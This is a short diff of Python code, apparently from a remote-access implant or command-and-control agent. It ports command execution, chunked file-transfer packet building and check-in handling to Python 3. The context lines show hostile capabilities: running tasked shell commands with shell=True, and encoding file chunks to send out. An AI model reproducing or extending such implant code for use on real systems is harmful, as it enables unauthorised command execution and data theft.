@@ -307,9 +307,9 @@ def process_packet(packetType, data, resultID):
                  start_crc32 = c.crc32_data(encodedPart)
                  comp_data = c.comp_data(encodedPart)
                  encodedPart = c.build_header(comp_data, start_crc32)
-                 encodedPart = base64.b64encode(encodedPart)
+                 encodedPart = base64.b64encode(encodedPart).decode('UTF-8')
 
-                 partData = "%s|%s|%s" %(partIndex, filePath, encodedPart)
+                 partData = "%s|%s|%s|%s" %(partIndex, filePath, size, encodedPart)
                  if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
                      break
 
@@ -983,7 +983,7 @@ def run_command(command, cmdargs=None):
             command = "{} {}".format(command,cmdargs)
         
         p = subprocess.Popen(command, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-        return p.communicate()[0].strip()
+        return p.communicate()[0].strip().decode('UTF-8')
 
 def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
 
@@ -1057,7 +1057,7 @@ while(True):
             except Exception as e:
                 result = build_response_packet(0, str('[!] Failed to check job buffer!: ' + str(e)))
                 process_job_tasking(result)
-            if data == defaultResponse:
+            if data.strip() == defaultResponse.strip():
                 missedCheckins = 0
             else:
                 decode_routing_packet(data)
